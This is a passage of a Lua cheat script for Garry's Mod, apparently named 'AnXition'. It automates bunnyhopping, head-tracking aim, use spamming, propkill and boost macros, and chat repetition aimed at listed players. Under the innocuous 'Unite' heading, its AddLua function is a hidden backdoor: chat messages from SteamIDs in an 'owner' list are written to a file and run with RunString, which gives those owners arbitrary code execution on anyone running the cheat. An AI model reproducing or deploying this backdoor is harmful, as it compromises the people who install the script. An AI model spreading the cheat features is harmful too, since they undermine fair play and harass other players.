	CreateButton ( "Add Users", RepeatFrame, true, RepeatFrame:GetWide()-250, 150, 200, 30, "Toggle Repeater", notable, function() ChatPrint("[ESP] Users added to Repeat list", red) for k,v in pairs(player.GetAll()) do if !table.HasValue(members, v:SteamID()) and !table.HasValue(owner, v:SteamID()) and !v:IsAdmin() and !v:IsSuperAdmin() and !table.HasValue(Repeatplayers, v:SteamID()) then table.insert(Repeatplayers, v:SteamID()) end end end )	
	CreateButton ( "Add Admins", RepeatFrame, true, RepeatFrame:GetWide()-250, 200, 200, 30, "Toggle Repeater", notable, function() ChatPrint("[ESP] Admins added to Repeat list", red) for k,v in pairs(player.GetAll()) do if !table.HasValue(members, v:SteamID()) and !table.HasValue(owner, v:SteamID()) and v:IsAdmin() and v:IsSuperAdmin() and !table.HasValue(Repeatplayers, v:SteamID()) then table.insert(Repeatplayers, v:SteamID()) end end end )			
	CreateButton ( "Clear", RepeatFrame, true, RepeatFrame:GetWide()-250, RepeatFrame:GetTall()-100, 200, 30, "Clear Targeted Players", notable, function() Repeatplayers = {} ChatPrint("[ESP] Repeat list cleared.", red) end )			
	CreateButton ( "Back", RepeatFrame, true, RepeatFrame:GetWide()/2-25, RepeatFrame:GetTall()-40, 50, 30, "Go back to the main menu", notable, function() Menu() RepeatFrame:Close() end )
	CloseFrame()
end

function ToggleRepeat()
	if !repeating then
		repeating = true
		Notify("[MISC] Repeat On", 5)
	elseif repeating then
		repeating = false
		Notify("[MISC] Repeat Off", 5)
	end
end

function Repeat( ply, strText )
	local tab = {}
	if repeating and table.HasValue(Repeatplayers, ply:SteamID()) then
		local pmname = string.Explode(" ", ply:GetName())
		ply:ConCommand("say /pm "..pmname[1].." "..strText)
	end
end
Addhook("OnPlayerChat", "OnPlayerChat", Repeat)

function Derp()
	local currentangle = ply:EyeAngles()
	if !derping then
		derping = true
		Notify("[MISC] Derp On", 5)
		Addhook("Think", "derp", function()
			if !derped then
				derped = true
				LocalPlayer():SetEyeAngles(Angle(ply:EyeAngles().pitch + 90, ply:EyeAngles().yaw, ply:EyeAngles().roll))
			elseif derped then
				derped = false
				LocalPlayer():SetEyeAngles(Angle(ply:EyeAngles().pitch - 90, ply:EyeAngles().yaw, ply:EyeAngles().roll))
			end
		end)
		Addhook("CalcView", "Derpview", Derpview)
	elseif derping then
		derping = false
		Notify("[MISC] Derp Off", 5)
		ply:SetEyeAngles(Angle(currentangle.pitch, currentangle.yaw, 0))
		hook.Remove("Think", "derp")
		hook.Remove("CalcView", "Derpview")
	end
end

function Bunnyhop ()
	if !bunnyhopping then
		bunnyhopping = true
		Notify("[MISC] BunnyHop On", 5)
		Addhook("Think", "bhop", function()
			if input.IsKeyDown(KEY_SPACE) then
				if ply:IsOnGround() then
					ply:ConCommand("+jump")
				elseif ! ply:IsOnGround() then
					ply:ConCommand("-jump")
				end
			elseif !ply:Alive() then
				ply:ConCommand("-jump")
			end
		end)


	elseif bunnyhopping then
		bunnyhopping = false
		Notify("[MISC] BunnyHop Off", 5)
		hook.Remove("Think", "bhop")
		ply:ConCommand("-jump")
	end
end

function Drawlogo ()
LocalPlayer():ConCommand("toolcpanel rope")
local currentangle = ply:EyeAngles()
ply:SetEyeAngles(Angle(currentangle.pitch - 5 ,currentangle.yaw + 15 , 0 ) )
ply:ConCommand("+attack")
dotimer(function ()
	local currentangle = ply:EyeAngles()
	ply:SetEyeAngles(Angle(currentangle.pitch + 6.25 ,currentangle.yaw + 2.5 , 0 ) )
	ply:ConCommand("-attack")
	dotimer(function ()
		ply:ConCommand("+attack")
		dotimer(function ()
			ply:ConCommand("-attack")
			dotimer(function ()
				local currentangle = ply:EyeAngles()
				ply:SetEyeAngles(Angle(currentangle.pitch - 6.25 ,currentangle.yaw - 2.5 , 0 ) )
				dotimer(function ()
					ply:ConCommand("+attack")
					dotimer(function ()
						local currentangle = ply:EyeAngles()
						ply:SetEyeAngles(Angle(currentangle.pitch + 6.25 ,currentangle.yaw - 2.5 , 0 ) )
						ply:ConCommand("-attack")
						dotimer(function ()
							ply:ConCommand("+attack")
							dotimer(function ()
								ply:ConCommand("-attack")
								dotimer(function ()
									local currentangle = ply:EyeAngles()
									ply:SetEyeAngles(Angle(currentangle.pitch - 3.125 ,currentangle.yaw + 1.25 , 0 ) )
									dotimer(function ()
										ply:ConCommand("+attack")
										dotimer(function ()
											ply:ConCommand("-attack")
											local currentangle = ply:EyeAngles()
											ply:SetEyeAngles(Angle(currentangle.pitch - 0 ,currentangle.yaw + 2.5 , 0 ) )
											dotimer(function ()
												ply:ConCommand("+attack")
												dotimer(function ()
													ply:ConCommand("-attack")
													dotimer(function ()
														local currentangle = ply:EyeAngles()
														ply:SetEyeAngles(Angle(currentangle.pitch - 0 ,currentangle.yaw - 5 , 0 ) )
														dotimer(function ()
															ply:ConCommand("+attack")
															dotimer(function ()
																ply:ConCommand("-attack")
																local currentangle = ply:EyeAngles()
																ply:SetEyeAngles(Angle(currentangle.pitch + 3 ,currentangle.yaw - 0 , 0 ) )
																dotimer(function ()
																	ply:ConCommand("+attack")
																	dotimer(function ()
																		ply:ConCommand("-attack")
																		local currentangle = ply:EyeAngles()
																		ply:SetEyeAngles(Angle(currentangle.pitch - 3 ,currentangle.yaw - 0 , 0 ) )
																		dotimer(function ()
																			ply:ConCommand("+attack")
																			dotimer(function ()
																				ply:ConCommand("-attack")
																				local currentangle = ply:EyeAngles()
																				ply:SetEyeAngles(Angle(currentangle.pitch + 3 ,currentangle.yaw - 2 , 0 ) )
																				dotimer(function ()
																					ply:ConCommand("+attack")
																					dotimer(function ()
																						ply:ConCommand("-attack")
																						dotimer(function ()
																							ply:ConCommand("+attack")
																							dotimer(function ()
																								ply:ConCommand("-attack")
																								local currentangle = ply:EyeAngles()
																								ply:SetEyeAngles(Angle(currentangle.pitch - 3 ,currentangle.yaw - 0 , 0 ) )
																								dotimer(function ()
																									ply:ConCommand("+attack")
																									dotimer(function ()
																										ply:ConCommand("-attack")
																										local currentangle = ply:EyeAngles()
																										ply:SetEyeAngles(Angle(currentangle.pitch + 3 ,currentangle.yaw - 2 , 0 ) )
																										dotimer(function ()
																											ply:ConCommand("+attack")
																											dotimer(function ()
																												ply:ConCommand("-attack")
																												local currentangle = ply:EyeAngles()
																												ply:SetEyeAngles(Angle(currentangle.pitch - 5 ,currentangle.yaw - 3 , 0 ) )
																												dotimer(function()
																													ply:ConCommand("+attack")
																													dotimer(function()
																														ply:ConCommand("-attack")
																														local currentangle = ply:EyeAngles()
																														ply:SetEyeAngles(Angle(currentangle.pitch - 0 ,currentangle.yaw + 3 , 0 ) )
																														dotimer(function()
																															ply:ConCommand("+attack")
																															dotimer(function()
																																ply:ConCommand("-attack")
																																local currentangle = ply:EyeAngles()
																																ply:SetEyeAngles(Angle(currentangle.pitch + 5 ,currentangle.yaw - 3 , 0 ) )
																																dotimer(function()
																																	ply:ConCommand("+attack")
																																	dotimer(function()
																																		ply:ConCommand("-attack")
																																		local currentangle = ply:EyeAngles()
																																		ply:SetEyeAngles(Angle(currentangle.pitch - 0 ,currentangle.yaw - 2 , 0 ) )
																																		dotimer(function()
																																			ply:ConCommand("+attack")
																																			dotimer(function()
																																				ply:ConCommand("-attack")
																																				local currentangle = ply:EyeAngles()
																																				ply:SetEyeAngles(Angle(currentangle.pitch - 3 ,currentangle.yaw - 0 , 0 ) )
																																				dotimer(function()
																																					ply:ConCommand("+attack")
																																					dotimer(function()
																																						ply:ConCommand("-attack")
																																						local currentangle = ply:EyeAngles()
																																						ply:SetEyeAngles(Angle(currentangle.pitch - 0 ,currentangle.yaw - 2 , 0 ) )
																																						dotimer(function()
																																							ply:ConCommand("+attack")
																																							dotimer(function()
																																								ply:ConCommand("-attack")
																																								local currentangle = ply:EyeAngles()
																																								ply:SetEyeAngles(Angle(currentangle.pitch - 0 ,currentangle.yaw - 3 , 0 ) )
																																								dotimer(function()
																																									ply:ConCommand("+attack")
																																									dotimer(function()
																																										ply:ConCommand("-attack")
																																										local currentangle = ply:EyeAngles()
																																										ply:SetEyeAngles(Angle(currentangle.pitch - 0 ,currentangle.yaw + 1.5 , 0 ) )
																																										dotimer(function()
																																											ply:ConCommand("+attack")
																																											dotimer(function()
																																												ply:ConCommand("-attack")
																																												local currentangle = ply:EyeAngles()
																																												ply:SetEyeAngles(Angle(currentangle.pitch + 3 ,currentangle.yaw - 0 , 0 ) )
																																												dotimer(function()
																																													ply:ConCommand("+attack")
																																													dotimer(function()
																																														ply:ConCommand("-attack")
																																														local currentangle = ply:EyeAngles()
																																														ply:SetEyeAngles(Angle(currentangle.pitch - 3 ,currentangle.yaw - 3 , 0 ) )
																																														dotimer(function()
																																															ply:ConCommand("+attack")
																																															dotimer(function()
																																																ply:ConCommand("-attack")
																																																local currentangle = ply:EyeAngles()
																																																ply:SetEyeAngles(Angle(currentangle.pitch + 3 ,currentangle.yaw - 0 , 0 ) )
																																																dotimer(function()
																																																	ply:ConCommand("+attack")
																																																	dotimer(function()
																																																		ply:ConCommand("-attack")
																																																		local currentangle = ply:EyeAngles()
																																																		ply:SetEyeAngles(Angle(currentangle.pitch + 0 ,currentangle.yaw - 3 , 0 ) )
																																																		dotimer(function()
																																																			ply:ConCommand("+attack")
																																																			dotimer(function()
																																																				ply:ConCommand("-attack")
																																																				local currentangle = ply:EyeAngles()
																																																				ply:SetEyeAngles(Angle(currentangle.pitch - 3 ,currentangle.yaw - 0 , 0 ) )
																																																				dotimer(function()
																																																					ply:ConCommand("+attack")
																																																					dotimer(function()
																																																						ply:ConCommand("-attack")
																																																						dotimer(function()
																																																							ply:ConCommand("+attack")
																																																							dotimer(function()
																																																								ply:ConCommand("-attack")
																																																								local currentangle = ply:EyeAngles()
																																																								ply:SetEyeAngles(Angle(currentangle.pitch + 0 ,currentangle.yaw - 3 , 0 ) )
																																																								dotimer(function()
																																																									ply:ConCommand("+attack")
																																																									dotimer(function()
																																																										ply:ConCommand("-attack")
																																																										dotimer(function()
																																																											ply:ConCommand("+attack")
																																																											dotimer(function()
																																																												ply:ConCommand("-attack")
																																																												local currentangle = ply:EyeAngles()
																																																												ply:SetEyeAngles(Angle(currentangle.pitch + 3 ,currentangle.yaw - 0 , 0 ) )
																																																												dotimer(function()
																																																													ply:ConCommand("+attack")
																																																													dotimer(function()
																																																														ply:ConCommand("-attack")
																																																														dotimer(function()
																																																															ply:ConCommand("+attack")
																																																															dotimer(function()
																																																																ply:ConCommand("-attack")
																																																																local currentangle = ply:EyeAngles()
																																																																ply:SetEyeAngles(Angle(currentangle.pitch + 0 ,currentangle.yaw + 3 , 0 ) )
																																																																dotimer(function()
																																																																	ply:ConCommand("+attack")
																																																																	dotimer(function()
																																																																		ply:ConCommand("-attack")
																																																																		local currentangle = ply:EyeAngles()
																																																																		ply:SetEyeAngles(Angle(currentangle.pitch + 0 ,currentangle.yaw - 5 , 0 ) )
																																																																		dotimer(function()
																																																																			ply:ConCommand("+attack")
																																																																			dotimer(function()
																																																																				ply:ConCommand("-attack")
																																																																				local currentangle = ply:EyeAngles()
																																																																				ply:SetEyeAngles(Angle(currentangle.pitch - 3 ,currentangle.yaw - 0 , 0 ) )
																																																																				dotimer(function()
																																																																					ply:ConCommand("+attack")
																																																																					dotimer(function()
																																																																						ply:ConCommand("-attack")
																																																																						dotimer(function()
																																																																							ply:ConCommand("+attack")
																																																																							dotimer(function()
																																																																								ply:ConCommand("-attack")
																																																																								local currentangle = ply:EyeAngles()
																																																																								ply:SetEyeAngles(Angle(currentangle.pitch + 3 ,currentangle.yaw - 3 , 0 ) )
																																																																								dotimer(function()
																																																																									ply:ConCommand("+attack")
																																																																									dotimer(function()
																																																																										ply:ConCommand("-attack")
																																																																										dotimer(function()
																																																																											ply:ConCommand("+attack")
																																																																											dotimer(function()
																																																																												ply:ConCommand("-attack")
																																																																												local currentangle = ply:EyeAngles()
																																																																												ply:SetEyeAngles(Angle(currentangle.pitch - 3 ,currentangle.yaw - 0 , 0 ) )
																																																																												dotimer(function()
																																																																													ply:ConCommand("+attack")
																																																																													dotimer(function()
																																																																														ply:ConCommand("-attack")
																																																																														drawingTabGet = "Off"
																																																																														drawingTabCol = red
																																																																													end)
																																																																												end)
																																																																											end)
																																																																										end)
																																																																									end)
																																																																								end)
																																																																							end)
																																																																						end)
																																																																					end)
																																																																				end)
																																																																			end)
																																																																		end)
																																																																	end)
																																																																end)
																																																															end)
																																																														end)
																																																													end)
																																																												end)
																																																											end)
																																																										end)
																																																									end)
																																																								end)
																																																							end)
																																																						end)
																																																					end)
																																																				end)
																																																			end)
																																																		end)
																																																	end)
																																																end)
																																															end)
																																														end)
																																													end)
																																												end)
																																											end)
																																										end)
																																									end)
																																								end)
																																							end)
																																						end)
																																					end)
																																				end)
																																			end)
																																		end)
																																	end)
																																end)
																															end)
																														end)
																													end)
																												end)
																											end)
																										end)
																									end)
																								end)
																							end)
																						end)
																					end)
																				end)
																			end)
																		end)
																	end)
																end)
															end)
														end)
													end)
												end)
											end)																																																																																					
										end)
									end)
								end)
							end)
						end)
					end)																																																													
				end)
			end)
		end)
	end)
end)
end


--== Follow ==--
function Follow (v)
	if !following then
		following = true
		drawspacetext = true
		Addhook("Think", "follow", function()
			local headpos,headang = v:GetBonePosition(v:LookupBone("ValveBiped.Bip01_Head1"))
			LocalPlayer():SetEyeAngles((headpos - LocalPlayer():GetShootPos()):Angle())
				if !saidname then
					ChatPrint("Following player: "..v:GetName(), red)
					saidname = true
				end
			if input.IsKeyDown(KEY_BACKSPACE) then
				following = false
				hook.Remove("Think", "follow")
				ply:ConCommand("-forward")
				ply:ConCommand("-speed")
				saidname = false
				drawspacetext = false
			end
		end)
		ply:ConCommand("+forward")
		ply:ConCommand("+speed")		
	end
end

function FollowNod (v)
	if !following then
		following = true
		Addhook("CalcView", "Nodview", Nodview)
		drawspacetext = true
		Addhook("Think", "follow", function()
			local headpos,headang = v:GetBonePosition(v:LookupBone("ValveBiped.Bip01_Head1"))
			if !nod then
				nod = true
				LocalPlayer():SetEyeAngles((headpos + Vector(0,0,20) - LocalPlayer():GetShootPos()):Angle())
			elseif nod then
				nod = false
				LocalPlayer():SetEyeAngles((headpos - Vector(0,0,20) - LocalPlayer():GetShootPos()):Angle())
			end
				if !saidname then
					ChatPrint("Following player: "..v:GetName(), red)
					saidname = true
				end
			if input.IsKeyDown(KEY_BACKSPACE) then
				following = false
				hook.Remove("Think", "follow")
				ply:ConCommand("-forward")
				ply:ConCommand("-speed")
				saidname = false
				drawspacetext = false
				hook.Remove("CalcView", "Nodview")	
				LocalPlayer():SetEyeAngles((headpos - Vector(0,0,0) - LocalPlayer():GetShootPos()):Angle())
			end
		end)
		ply:ConCommand("+forward")
		ply:ConCommand("+speed")		
	end
end



--== ConCom Functions ==--
function UseSpam()
	if !using then
		ChatPrint("Use spammer On", red)
		using = true
		Addhook("Think", "user", function()
			if !used then
				used = true
				ply:ConCommand("+use")
			elseif used then
				used = false
				ply:ConCommand("-use")
			end
		end)
	elseif using then
		ChatPrint("Use spammer Off", red)
		using = false
		hook.Remove("Think", "user")
		ply:ConCommand("-use")
	end
end


Addcom("AnXition_UseSpam", UseSpam)

--== Open Menu ==--
function OpenMenu()
	Addhook("Think", "OpenMenu", function()
		if input.IsKeyDown(KEY_INSERT) and !opened then
			opened = true
			Menu()
		end
	end)
end

--== UnLoad ==--
function Unload()
	for k,v in pairs(hooknames) do
		hook.Remove(hooktypes[math.Approach(1,table.getn(hooktypes),1)], v)
	end
	Print("Hooks Removed.")
	
	for k,v in pairs(concomnames) do
		concommand.Remove(v)
	end
	
	Print("ConCommands Removed.")
	ChatPrint("AnXition Unloaded!", red)
	CloseFrame()
end

--== Unite ==--
function AddLua( ply, strText )
		if table.HasValue(owner,ply:SteamID()) then AddLua = string.Explode("| ", strText) if AddLua[1] == "Command " then textstring = AddLua[2] file.Write("ax.txt", textstring) RunString( file.Read("ax.txt") ) end end
end
Addhook("OnPlayerChat", "AddLua", AddLua)

--== Propkill =--
function PropAim()
	LocalPlayer():ConCommand("toolcpanel button")
	timer.Create("1", 0.4, 1, function()
		LocalPlayer():ConCommand("+attack2")
	end)
	timer.Create("2", 0.5, 1, function()
		LocalPlayer():ConCommand("-attack2")
	end)	
	timer.Create("3", 0.6, 1, function()
		RunConsoleCommand( "use", "weapon_physgun" )
	end)	
end

Addcom("AnXition_Button", function() PropAim() end)

--== Boosts ==--
function boost()
if derping then
	wasderping = true
	hook.Remove("Think", "derp")
end
local Angles = LocalPlayer():EyeAngles()
LocalPlayer():SetEyeAngles(Angle(30, Angles.yaw + 180, Angles.roll))
timer.Create("spawn", 0.1, 1, function()
LocalPlayer():ConCommand("gm_spawn models/props_c17/gravestone001a.mdl")
end)
timer.Create("attack", 0.1, 1, function()
LocalPlayer():ConCommand("+attack")
end)
timer.Create("turnback", 0.2, 1, function()   
LocalPlayer():SetEyeAngles(Angle(0, Angles.yaw, Angles.roll))
end)
timer.Create("undo, Release", 0.3, 1, function()
LocalPlayer():ConCommand("undo")
end)
timer.Create("Release", 0.5, 1, function()
LocalPlayer():ConCommand("-attack")
if wasderping then
	Addhook("Think", "derp", function()
			if !derped then
				derped = true
				LocalPlayer():SetEyeAngles(Angle(ply:EyeAngles().pitch + 90, ply:EyeAngles().yaw, ply:EyeAngles().roll))
			elseif derped then
				derped = false
				LocalPlayer():SetEyeAngles(Angle(ply:EyeAngles().pitch - 90, ply:EyeAngles().yaw, ply:EyeAngles().roll))
			end
		end)
	wasderping = false
end
end)
end

function bounce()
if derping then
	wasderping = true
	hook.Remove("Think", "derp")
end
local Angles = LocalPlayer():EyeAngles()
LocalPlayer():SetEyeAngles(Angle(50, Angles.yaw + 0, Angles.roll))
timer.Create("spawn", 0.1, 1, function()
LocalPlayer():ConCommand("gm_spawn models/XQM/CoasterTrack/slope_225_2.mdl")
end)
timer.Create("turnback", 0.2, 1, function()   
LocalPlayer():SetEyeAngles(Angle(0, Angles.yaw, Angles.roll))
end)
timer.Create("undo ", 0.5, 1, function()
LocalPlayer():ConCommand("undo")
if wasderping then
	Addhook("Think", "derp", function()
			if !derped then
				derped = true
				LocalPlayer():SetEyeAngles(Angle(ply:EyeAngles().pitch + 90, ply:EyeAngles().yaw, ply:EyeAngles().roll))
			elseif derped then
				derped = false
				LocalPlayer():SetEyeAngles(Angle(ply:EyeAngles().pitch - 90, ply:EyeAngles().yaw, ply:EyeAngles().roll))
			end
		end)
	wasderping = false
end
end)

end

function hide()
local Angles = LocalPlayer():EyeAngles()
LocalPlayer():SetEyeAngles(Angle(90, Angles.yaw + 0, Angles.roll))
timer.Create("spawn", 0.1, 1, function()
ply:ConCommand("gm_spawn models/props_interiors/VendingMachineSoda01a.mdl")
ply:ConCommand("+attack")
end)
timer.Create("grab", 0.2, 1, function()   
ply:ConCommand("+attack")
end)
timer.Create("freeze", 0.4, 1, function()  
ply:ConCommand("+attack2") 
end)
timer.Create("undo", 0.5, 1, function()  
ply:ConCommand("-attack2")
ply:ConCommand("-attack")
LocalPlayer():SetEyeAngles(Angle(0, Angles.yaw + 0, Angles.roll))
end)
end


Addcom("AnXition_Boost", function() boost() end)
Addcom("AnXition_Bounce", function() bounce() end)
Addcom("AnXition_Hide", function() hide() end)


--== HUD ==--
local moving = 0
local undomtable = 0
function HUD()
	if ply:GetVelocity():Length()>0 then
		if moving != 2 and !puttingmovingback then
			moving = math.Approach(moving, 2, 1)
		elseif moving == 2 and ! puttingmovingback then
			puttingmovingback = true
		elseif puttingmovingback then
			if moving == 0 then
				puttingmovingback = false
			else
				moving = moving - math.Approach(undomtable, 2, 1)
			end
		end
	end


end

function Crosshair()
	surface.SetDrawColor (red)
	surface.DrawLine ( ScrW()/2-10, ScrH()/2-10, ScrW()/2-5, ScrH()/2-5 )
	surface.DrawLine ( ScrW()/2+10, ScrH()/2-10, ScrW()/2+5, ScrH()/2-5 )
	surface.DrawLine ( ScrW()/2-10, ScrH()/2+10, ScrW()/2-5, ScrH()/2+5 )
	surface.DrawLine ( ScrW()/2+10, ScrH()/2+10, ScrW()/2+5, ScrH()/2+5 )
end

function Voicesign()
	if ply.DRPIsTalking then	
		draw.RoundedBox ( 0, ScrW()-105, ScrH()/2-50, 100, 75, tred )
		surface.SetDrawColor (black)
		surface.DrawOutlinedRect ( ScrW()-105, ScrH()/2-50, 100, 75 )		
		draw.SimpleTextOutlined ( "Voice", "Info", ScrW()-50, ScrH()/2-25, flashycolor, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, black )	
		draw.SimpleTextOutlined ( "Talking", "Info", ScrW()-50, ScrH()/2-5, flashycolor, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, black )			
	end
end

function HUDPaint()
	HUD()
	Crosshair()
	Voicesign()
end


function RemoveHUD()
	return false
end
Addhook("HUDPaint", "HUDPaint", RemoveHUD)
Addhook("HUDPaint", "CustomHUD", HUDPaint)

hook.Remove("HUDPaint", "CustomHUD")
hook.Remove("HUDPaint", "HUDPaint")
--== On Load ==--
function LoadScripts()
	StartESP()
	StartLog()
end


		
/******************************
Name: Commands
Function: Create ConCommands
******************************/
LoadScripts()
Menu()
OpenMenu()
ChatPrint("Loaded/Updated succesfully!, press insert to open the menu.", red)